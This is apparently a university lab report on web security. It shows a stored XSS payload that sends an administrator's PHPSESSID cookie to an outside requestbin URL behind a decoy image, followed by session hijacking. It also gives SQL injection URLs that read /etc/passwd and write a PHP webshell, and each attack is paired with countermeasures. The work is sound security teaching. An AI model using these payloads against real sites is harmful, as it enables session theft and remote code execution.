# Language-based Security

## Lab 3 - Web Application Security

### Part 1: Cross-Site Scripting (XSS)

The main XSS vulnerability that we found was in the "text" field of the comments section on the home page. Indeed, there was no filtering or encoding of any kind of HTML charaters or quotes.
This allowed us to inject some javascript code in the field to display a simple picture and, at the same time, steal the `PHPSESSID`cookie of the administator of the website checking the comments page.

#### Description of the attack

The command that we decided to insert in the "text" field to steal the administrator's cookie is:
```javascript
<script>var backup_url='http://media.istockphoto.com/photos/head-shot-of-cute-purebred-rottweiler-dog-pup-hanging-with-paws-over-picture-id1096889426';document.write('<img onerror="this.onerror=null;this.src=backup_url;" src="http://en8mgdzvtyrzg.x.pipedream.net/?'+document.cookie+'  "/>');</script>
```

When the administrator checks the comments page, the first source of the image will send his cookie (via the `document.cookie`) to our requestbin url where it can be easily retrieved.

![Requestbin used to hijack the administrator's cookie ](assets/pipedream.png)

The thing is, the victim will only see that someone uploaded a picture of a dog because a backup url is used in the `onerror` attribute of the `<img/>` tag to prevent showing a broken image which could be suspicious.

![Dog picture viewed by the administrator ](assets/dog-picture.png)

All we need then, to hijack the administator's session, is to replace the value of our `PHPSESSID`cookie, in the dev tools of the web browser, by the value set in the administrator's cookie.

![Session hijacking via manual modification of the PHPSESSID cookie ](assets/chrome-dev-tool.png)

Finally, we just need to reload the web page and we successfully hijacked the administrator's session. When we click on the "admin" link, we bypass the login/password step:

![Administrator page ](assets/admin-panel.png)

To prevent this attack from happening, we should sanitize user's inputs in the comments' text field. 
We can add escaping/encoding functions in the back-end source code to prevent special HTML characters usage. Some PHP functions are discussed in the countermeasures part.

#### Countermeasures

##### Client-side

Disable javascript code execution option in the web browser:
It is possible in modern web browsers to disable javascript code execution when visiting a web page. This would prevent cookie stealing attacks but some websites need javascript to work properly, so it can't be a solution on the long run.

##### Server-side

HttpOnly flag: 
One thing that could be done to prevent cookie stealing is to set the HttpOnly flag on the cookies sent by the server so that they can only be communicated over secure channels (SSL/TLS encryption) and become unreadable with javascript code.
The thing is, we also need to switch to an HTTPS communication protocol between the server and the client if we want the cookies to be sent.


Use escaping/encoding functions:
Another thing that could be done is to encode HTML entites in the user's inputs like `>` to `&gt;`, `<` to `&lt;` and quotes like `'` and `"` respectively to `&#x27;` and `&quot;`.
In PHP for exemple, we can use functions like `htmlentities()` or `htmlspecialchars()` to escape all special charaters that could be used to inject code in the input fields.

### Part 2: SQL Injection

#### Known Vulnerabilities

First of all, we tried to find vulnerabilities in the admin form, for example by escaping password verification, but this method was not very successful. Then, we found that the URL was not sanitized, meaning that some commands can be executed through the path. In this lab, we need to perfom SQL injections, meaning that we will execute SQL queries inside the URL.

#### Exploiting File Privilege

Using SQL injection, we can for example input a command that reads the `/etc/passwd` file and displays its content into the update form, as seen in the image below:

![Display passwd file in a form](assets/passwd-file.png)

In order to perform this action, we used the url `http://localhost/admin/edit.php?id=0%20union%20select%201,2,load_file("/etc/passwd"),4`, that executes the query directly on the server with the mysql user's rights, which has more privileges than the default www-data user.
Thus, it is possible to display sensitive files' content. For example, in this case, the file containing informations about users registered on the system. Before we would also have found passwords in this file, but modern UNIX systems now use the `/etc/shadow` file to save password hashes. 


#### Create a Webshell

Then, another vulnerability that could harm the system would be to execute unauthorized code remotely, by putting this request as an url :

`http://localhost/admin/edit.php?id=0%20union%20select%201,2,%22%3C?php%20system($_GET[%27cmd%27]);%20?%3E%22,4%20into%20outfile%20%22/var/www/css/webshell.php%22`

By doing this, the mysql user will create in our `css` folder, which has write access for everyone, a php file to launch a shell on the server. We can see it on the image below :

![Webshell file located in css folder](assets/webshell-file.png)

Our file contains php code that will fetch the "cmd" parameter in our url, and run it through a shell:

```php
<?php
    system($_GET['cmd']);
?>

```

Now that we have our php file on the server, we can execute code remotely:

![Request whoami executed remotely](assets/whoami-req.png)

![Request uname executed remotely](assets/uname-req.png)

Note that the webshell file belongs to mysql, but when we run the command `whoami` through the web application, it seems that we are logged in as www-data user, which is the standard user that is often reserved for remote users on web apps in Apache. It has few rights on the system but if we modify a little bit our previous URL that writes a php file, we could, for example, activate the SUID flag on the file. By setting our real user ID as the effective user ID, we could send commands using mysql user, which has advanced rights on the system. 

#### Countermeasures

##### Web Application

- Parameterised queries : MySQL supports parameterised queries, meaning that instead of injecting values directly in the command, it uses inputs as parameters. Those are then formatted with only acceptable values into the SQL statement.
- Remove error messages : not the case in this app, but on some web servers, if an error occurs, it is sometimes thrown back to the client's browser. This could allow a potential attacker to use this information disclosure (like tables structure for example) to break the system.
    
##### Database System

- Use the principle of least privilege : every web application on a server should have its own database account. Running an application using privileged users (as root, or mysql user) can be very harmful in this type of attack. Anything an administrator can do, can also be done by an attacker. We have a case here by being able to read the passwd file.
- An even more secure countermeasure would be, for each database account, to authorize only writing and reading the database but forbid harmful actions like dropping tables.
- Use stored procedures : extra layer of abstraction on your application where you can specify every action that are allowed on each table by creating prepared functions. You use them instead of querying directly your database. Any request which is not part of a procedure would be rejected because, in a standard usage, you would not need to do this action.

##### Operating System

- Change permissions on the server: In web servers, it is mostly recommended that directories' permissions should be 755 and 644 for the files. Permissions 777 are not recommended because they give too many rights. When we created the webshell, we used the writing rights that were allowed in the css folder. Those rights don't have a purpose during normal execution so, by removing this permission, we would ensure that users can't write in this folder.




### Sources

1. [Sécurisez vos cookies (instructions Secure et HttpOnly)](https://blog.dareboost.com/fr/2016/12/securisez-cookies-instructions-secure-httponly/)
2. [SQL Injection Attacks and Some Tips on How to Prevent Them](https://www.codeproject.com/Articles/9378/SQL-Injection-Attacks-and-Some-Tips-on-How-to-Prev)
